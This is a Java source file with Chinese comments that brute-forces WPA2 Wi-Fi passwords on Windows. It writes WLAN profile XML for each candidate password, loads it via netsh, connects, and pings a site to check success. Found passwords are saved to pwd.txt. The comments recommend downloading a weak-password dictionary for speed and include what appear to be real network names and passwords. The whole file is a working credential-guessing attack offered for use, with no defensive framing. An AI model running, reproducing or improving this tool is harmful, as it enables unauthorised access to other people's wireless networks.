package app;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Demo {

	public static final String CODE_UTF8 = "utf-8";
	public static final String CODE_GBK = "gbk";
	public static String RESOURCE_PATH = "";// 默认wifi配置文件生成路径

	public static final String WIFI_LIST = "netsh wlan show networks mode=bssid";// 列出所有可用wifi
	public static final String WIFI_ADDFILE = "netsh wlan add profile filename=";// 添加配置文件,后面需要加上你生成的配置文件名称
	public static final String WIFI_CONNECT = "netsh wlan connect name=";// 连接wifi,后面加上你需要连接的wifi名称

	public static final String TEST_CONNECT = "ping www.baidu.com";// wifi连接后测试是否ping通的一个网址

	// 一个配置文件模板
	public static String XML_FORMAT = "<?xml version=\"1.0\"?>\n"
			+ "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n"
			+ "<name>WIFI_NAME</name>\n" + "<SSIDConfig>\n" + "<SSID>\n" + "<name>WIFI_NAME</name>\n" + "</SSID>\n"
			+ "</SSIDConfig>\n" + "<connectionType>ESS</connectionType>\n" + "<connectionMode>auto</connectionMode>\n"
			// manual
			+ "<MSM>\n" + "<security>\n" + "<authEncryption>\n" + "<authentication>WPA2PSK</authentication>\n"
			+ "<encryption>AES</encryption>\n" + "<useOneX>false</useOneX>\n" + "</authEncryption>\n" + "<sharedKey>\n"
			+ "<keyType>passPhrase</keyType>\n" + "<protected>false</protected>\n"
			+ "<keyMaterial>PASSWORD</keyMaterial>\n" + "</sharedKey>\n" + "</security>\n" + "</MSM>\n"
			+ "<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">\n"
			+ "<enableRandomization>false</enableRandomization>\n" + "</MacRandomization>\n" + "</WLANProfile>\n";

	static {
		URL resource4 = Demo.class.getResource("/resource");
		System.out.println(resource4.getFile());
		RESOURCE_PATH = resource4.getPath();
	}

	public static void connect() {
		// CU_FKbH:FKbH----
		BufferedWriter bw = null;

		try {
			BufferedReader bufferedReader = new BufferedReader(
					new FileReader(Connector.resource + "/gencode.txt"));
			boolean flag = true;
			String wifiName = "xxx";
			String pwdpre = "xxx";// 一直更换这个密码就好了
			List<Object> asList = Arrays.asList(bufferedReader.lines().toArray());

			while (flag) {
				// 建议这个密码去网上找弱口令字典，否则自己随机生成真的太慢了（一秒钟只能尝试最多两次连接）
				for (Object object : asList) {
					// System.out.println(object);
					connect(wifiName, pwdpre + (String) object);
					if (connectResult()) {
						System.out.println("连接成功,密码是:" + (String) object);
						bw = new BufferedWriter(new FileWriter(new File(Connector.resource + "/pwd.txt")));
						bw.write("wifi:" + wifiName + ",password:" + (String) object);

					} else {
						System.out.println("连接失败,请更换密码");
					}
				}

			}

		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				bw.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

	}

	public static void my() {
		connect("ss", "ss");
		// 最后校验是否连接成功
		if (connectResult()) {
			System.out.println("连接成功,密码是:");
		} else {
			System.out.println("连接失败,请更换密码");
		}

//		System.out.println("开始生成配置文件......");
//		if (!createXml("CU_P4Jk", "p4jkaycu", DEFAULT_PATH)) {
//			System.out.println("配置文件生成失败......");
//		}
//		System.out.println("开始加载配置文件......");
//		if (!addXml("CU_P4Jk", DEFAULT_PATH)) {
//			System.out.println("配置文件加载失败......");
//		}
//		System.out.println("开始尝试连接......");
//		execute(WIFI_CONNECT + "CU_P4Jk", DEFAULT_PATH);
	}

	public static void main(String[] args) {
//		connect();
		my();
		// 列出所有的可用wifi，key是wifi名称，value是wifi的强度(用这个不如自己打开wifi看附近有哪些可用来得快)
//		Map<String,String> map = getWifi();
//		for(String key:map.keySet()){
//			System.out.println(key+":"+map.get(key));
//		}
		// CU_FKbH:FKbH----

//		boolean flag = true;
//		String wifiName = "wifiName";
//		while(flag){
//			//建议这个密码去网上找弱口令字典，否则自己随机生成真的太慢了（一秒钟只能尝试最多两次连接）
//			String password = "12345678";//一直更换这个密码就好了
//			if(testConnected(wifiName,password)){
//				flag = false;
//			}
//		}
	}

	/** 尝试对指定wifi设定一个密码，然后连接，连接成功返回true */
	public static void connect(String wifiName, String password) {
		System.out.println("connect:开始生成配置文件......");
		if (!createXml(wifiName, password, RESOURCE_PATH)) {
			System.out.println("connect:配置文件生成失败......");
		}
		System.out.println("connect:开始加载配置文件......");
		if (!addXml(wifiName, RESOURCE_PATH)) {
			System.out.println("connect:配置文件加载失败......");
		}
		System.out.println("connect:开始尝试连接......");
		execute(WIFI_CONNECT + wifiName, RESOURCE_PATH);
	}

	/** 最后，ping 一个地址，测试是否真的连上网络了 */
	public static boolean connectResult() {
		try {
			Thread.sleep(1000);// 这个休眠的意义是即时连接成功，你立刻ping 也还是会失败，必须让电脑反应过来，必须等一会
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		boolean flag = true;
		for (String rs : execute(TEST_CONNECT, null)) {
			System.out.println(rs);
			if ("Ping 请求找不到主机 www.baidu.com。请检查该名称，然后重试。".equals(rs)) {
				flag = false;
				break;
			}
		}
		return flag;
	}

	/** 在指定目录下，加载指定wifi名称的配置文件 */
	public static boolean addXml(String wifiName, String path) {
		boolean flag = false;
		for (String rs : execute(WIFI_ADDFILE + wifiName + ".xml", path)) {
			if (("已将配置文件 " + wifiName + " 添加到接口 WLAN。").equals(rs)) {
				flag = true;
				// System.out.println(true);
				break;
			}
		}
		return flag;
	}

	/** 在指定目录下，对指定wifi生成一个指定密码的配置文件，文件名为wifi.xml */
	public static boolean createXml(String wifiName, String password, String path) {
		boolean flag = false;
		File file = new File(path, wifiName + ".xml");
		try {
			PrintStream ps = new PrintStream(file);
			String str = XML_FORMAT.replaceAll("WIFI_NAME", wifiName).replaceAll("PASSWORD", password);
			ps.println(str);
			ps.close();
			flag = true;
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
		return flag;
	}

	/** 获取所有可用的wifi名称,key是wifi名称，value是信号强度 */
	public static Map<String, String> getWifi() {
		Map<String, String> map = new HashMap<>();
		// 这里使用UTF-8去获取，中文名称的wifi不会乱码
		String key = null;
		String value = null;
		boolean saveFlag = false;
		for (String str : execute(WIFI_LIST, null, CODE_UTF8)) {
			if (str.startsWith("SSID")) {
				key = str.substring(9, str.length());
			} else if (str.endsWith("%")) {
				value = str.substring(str.length() - 3, str.length() - 1);
				saveFlag = true;
			}
			if (saveFlag) {
				map.put(key, value);
				saveFlag = false;
			}
		}
		return map;
	}

	/** 在指定目录下执行指定命令,默认使用GBK编码 */
	public static List<String> execute(String cmd, String filePath) {
		return execute(cmd, filePath, CODE_GBK);
	}

	/** 在指定目录下执行指定命令,返回指定编码的内容 */
	public static List<String> execute(String cmd, String filePath, String code) {
		Process process = null;
		List<String> result = new ArrayList<String>();
		try {
			if (filePath != null) {
				process = Runtime.getRuntime().exec(cmd, null, new File(filePath));
			} else {
				process = Runtime.getRuntime().exec(cmd);
			}
			BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), code));
			String line = null;
			while ((line = bReader.readLine()) != null) {
				result.add(line);
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		return result;
	}
}
